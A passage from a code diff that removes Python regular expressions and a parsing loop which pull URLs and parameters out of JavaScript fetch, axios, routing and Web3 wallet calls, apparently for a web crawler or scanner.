-            r'fetch\(["\']?([^"\';\)]+)',
-            r'axios\.([a-z]+)\(["\']?([^"\';\)]+)',
-            r'jQuery\.([a-z]+)\(["\']?([^"\';\)]+)',
-            r'\$\.([a-z]+)\(["\']?([^"\';\)]+)',
-            r'XMLHttpRequest\.open\([^,]*,\s*["\']([^"\']+)["\']',
-            
-            # Framework routing
-            r'router\.push\(["\']?([^"\';\)]+)',
-            r'router\.replace\(["\']?([^"\';\)]+)',
-            r'navigate\(["\']?([^"\';\)]+)',
-            r'redirect\(["\']?([^"\';\)]+)',
-            r'pushState\([^,]*,\s*[^,]*,\s*["\']([^"\']+)["\']',
-            
-            # Web3 specific function calls
-            r'connectWallet\(["\']?([^"\';\)]+)',
-            r'walletConnect\(["\']?([^"\';\)]+)',
-            r'ethereum\.request\([^)]*["\']([^"\']+)["\']',
-            r'web3\.eth\.([^(]+)\(["\']?([^"\';\)]+)',
-            r'provider\.send\([^)]*["\']([^"\']+)["\']',
-            r'signer\.([^(]+)\(["\']?([^"\';\)]+)',
-            r'contract\.methods\.([^(]+)\(["\']?([^"\';\)]+)',
-            r'switchChain\(["\']?([^"\';\)]+)',
-            r'addChain\(["\']?([^"\';\)]+)'
-        ]
-        
-        lines = js_content.split('\n')
-        for line_num, line in enumerate(lines, 1):
-            for pattern in js_patterns:
-                matches = re.finditer(pattern, line, re.IGNORECASE)
-                for match in matches:
-                    groups = match.groups()
-                    if groups:
-                        # Extract parameter information
-                        if len(groups) == 1:
-                            param_name = f"js_param_{line_num}_{match.start()}"
-                            param_value = groups[0].strip('"\'')
-                        elif len(groups) == 2:
-                            param_name = groups[0].strip('"\'') if groups[0] else f"js_param_{line_num}"
-                            param_value = groups[1].strip('"\'') if groups[1] else groups[0].strip('"\'')
